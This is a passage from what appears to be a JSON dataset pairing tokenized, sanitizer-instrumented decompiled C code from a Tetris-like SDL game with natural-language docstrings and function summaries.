            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "4",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "m",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "m",
            ")",
            ";",
            "}",
            "if",
            "(",
            "j",
            ">",
            "=",
            "g",
            "-",
            ">",
            "m",
            ")",
            "break",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "fgetc",
            "(",
            "f",
            ")",
            "=",
            "=",
            "49",
            ")",
            "{",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "i",
            ">",
            "0xF",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_232560",
            ",",
            "i",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "j",
            ">",
            "9",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_2325A0",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_2325E0",
            ",",
            "g",
            ")",
            ";",
            "v5",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v5",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "(",
            "16",
            "*",
            "(",
            "j",
            "+",
            "10",
            "*",
            "i",
            "+",
            "1",
            ")",
            "+",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "+",
            "4",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "v5",
            ")",
            "__asan_report_store1",
            "(",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ")",
            ";",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "state",
            "=",
            "1",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "i",
            ">",
            "0xF",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_232640",
            ",",
            "i",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "j",
            ">",
            "9",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_232680",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_2326C0",
            ",",
            "g",
            ")",
            ";",
            "v6",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v6",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "16",
            "*",
            "(",
            "j",
            "+",
            "10",
            "*",
            "i",
            "+",
            "1",
            ")",
            "+",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "8",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "v6",
            ")",
            "__asan_report_store4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ")",
            ";",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "r",
            "=",
            "186",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "i",
            ">",
            "0xF",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_232720",
            ",",
            "i",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "j",
            ">",
            "9",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_232760",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_2327A0",
            ",",
            "g",
            ")",
            ";",
            "v7",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "g",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v7",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "16",
            "*",
            "(",
            "j",
            "+",
            "10",
            "*",
            "i",
            "+",
            "1",
            ")",
            "+",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "12",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "v7",
            ")",
            "__asan_report_store4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "g",
            ")",
            ";",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "g",
            "=",
            "186",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "i",
            ">",
            "0xF",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_232800",
            ",",
            "i",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "j",
            ">",
            "9",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_232840",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_232880",
            ",",
            "g",
            ")",
            ";",
            "v8",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "b",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v8",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "16",
            "*",
            "(",
            "j",
            "+",
            "10",
            "*",
            "i",
            "+",
            "1",
            ")",
            "+",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "16",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "v8",
            ")",
            "__asan_report_store4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "b",
            ")",
            ";",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "b",
            "=",
            "186",
            ";",
            "}",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "j",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_2329A0",
            ",",
            "j",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "fgetc",
            "(",
            "f",
            ")",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "i",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_2329E0",
            ",",
            "i",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "}",
            "if",
            "(",
            "v12",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "v2",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v2",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v2",
            "=",
            "1172321806L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v2",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"stack\" function is likely used to handle and manipulate data structures in a Last In First Out (LIFO) manner, possibly for implementing stacks in various programming contexts.",
            "The function malloc is used to allocate memory dynamically in C programming and is often used to allocate memory for data structures like arrays and structs.",
            "The __read function is used to read data from a device or file, possibly using an ioctl operation to handle specific requests.",
            "This function likely calculates the quantity (q) of words (word) in a given input or text."
        ],
        "longer_label": "The code initializes a game level, dynamically allocates memory if necessary, reads from a file, and manipulates data structures while handling potential overflow and type mismatch errors."
    },
    {
        "id": 226,
        "docstring_tokens": [
            "Initialize",
            "a",
            "game",
            "structure",
            "with",
            "specified",
            "grid",
            "and",
            "shape",
            "matrices",
            ",",
            "set",
            "initial",
            "values",
            "for",
            "game",
            "attributes",
            ",",
            "and",
            "copy",
            "shape",
            "and",
            "next",
            "matrices",
            "from",
            "a",
            "pre-defined",
            "array",
            "based",
            "on",
            "random",
            "selection",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "game_0",
            "*",
            "g",
            ",",
            "cell_0",
            "(",
            "*",
            "s",
            ")",
            "[",
            "4",
            "]",
            "[",
            "4",
            "]",
            ")",
            "{",
            "unsigned",
            "int",
            "Ticks",
            ";",
            "unsigned",
            "int",
            "ls",
            ";",
            "unsigned",
            "int",
            "v4",
            ";",
            "unsigned",
            "int",
            "v5",
            ";",
            "cell_0",
            "(",
            "*",
            "v6",
            ")",
            "[",
            "]",
            ";",
            "int",
            "ms",
            ";",
            "unsigned",
            "int",
            "v8",
            ";",
            "unsigned",
            "int",
            "v9",
            ";",
            "unsigned",
            "int",
            "v10",
            ";",
            "int",
            "v11",
            ";",
            "int",
            "v12",
            ";",
            "cell_0",
            "(",
            "*",
            "v13",
            ")",
            "[",
            "]",
            ";",
            "int",
            "v14",
            ";",
            "int",
            "r",
            ";",
            "init",
            "(",
            "16",
            ",",
            "10",
            ",",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "]",
            ")",
            "g",
            "-",
            ">",
            "grid",
            ")",
            ";",
            "init",
            "(",
            "4",
            ",",
            "4",
            ",",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "]",
            ")",
            "g",
            "-",
            ">",
            "shape",
            ")",
            ";",
            "init",
            "(",
            "4",
            ",",
            "4",
            ",",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "]",
            ")",
            "g",
            "-",
            ">",
            "next",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_232AE0",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "x",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "20",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "x",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "x",
            ")",
            ";",
            "}",
            "g",
            "-",
            ">",
            "x",
            "=",
            "3",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_232B40",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "y",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "24",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "y",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "y",
            ")",
            ";",
            "}",
            "g",
            "-",
            ">",
            "y",
            "=",
            "0",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_232BA0",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "g",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "g",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "g",
            ")",
            ";",
            "}",
            "g",
            "-",
            ">",
            "n",
            "=",
            "16",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_232C00",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "m",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "4",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "m",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "m",
            ")",
            ";",
            "}",
            "g",
            "-",
            ">",
            "m",
            "=",
            "10",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_232C60",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "ns",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "8",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "ns",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "ns",
            ")",
            ";",
            "}",
            "g",
            "-",
            ">",
            "ns",
            "=",
            "4",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_232CC0",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "ms",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "12",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "ms",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "ms",
            ")",
            ";",
            "}",
            "g",
            "-",
            ">",
            "ms",
            "=",
            "4",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_232D20",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "level",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "32",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "level",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "level",
            ")",
            ";",
            "}",
            "g",
            "-",
            ">",
            "level",
            "=",
            "1",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_232D80",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "score",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "28",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "score",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "score",
            ")",
            ";",
            "}",
            "g",
            "-",
            ">",
            "score",
            "=",
            "0",
            ";",
            "Ticks",
            "=",
            "SDL_GetTicks",
            "(",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_232DE0",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "time",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "36",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "time",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "time",
            ")",
            ";",
            "}",
            "g",
            "-",
            ">",
            "time",
            "=",
            "Ticks",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_232E40",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "ls",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "16",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "ls",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "ls",
            ")",
            ";",
            "}",
            "ls",
            "=",
            "g",
            "-",
            ">",
            "ls",
            ";",
            "v4",
            "=",
            "SDL_GetTicks",
            "(",
            ")",
            ";",
            "v5",
            "=",
            "v4",
            ";",
            "if",
            "(",
            "!",
            "ls",
            ")",
            "__ubsan_handle_divrem_overflow",
            "(",
            "&",
            "off_232A20",
            ",",
            "v4",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "v6",
            "=",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "]",
            ")",
            "(",
            "*",
            "s",
            ")",
            "[",
            "4",
            "*",
            "(",
            "__int64",
            ")",
            "(",
            "int",
            ")",
            "(",
            "v5",
            "%",
            "ls",
            ")",
            "]",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_232EA0",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "ms",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "12",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "ms",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "ms",
            ")",
            ";",
            "}",
            "ms",
            "=",
            "g",
            "-",
            ">",
            "ms",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_232F00",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "ns",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "8",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "ns",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "ns",
            ")",
            ";",
            "}",
            "copyMatrix",
            "(",
            "g",
            "-",
            ">",
            "ns",
            ",",
            "ms",
            ",",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "]",
            ")",
            "g",
            "-",
            ">",
            "shape",
            ",",
            "v6",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_232F60",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
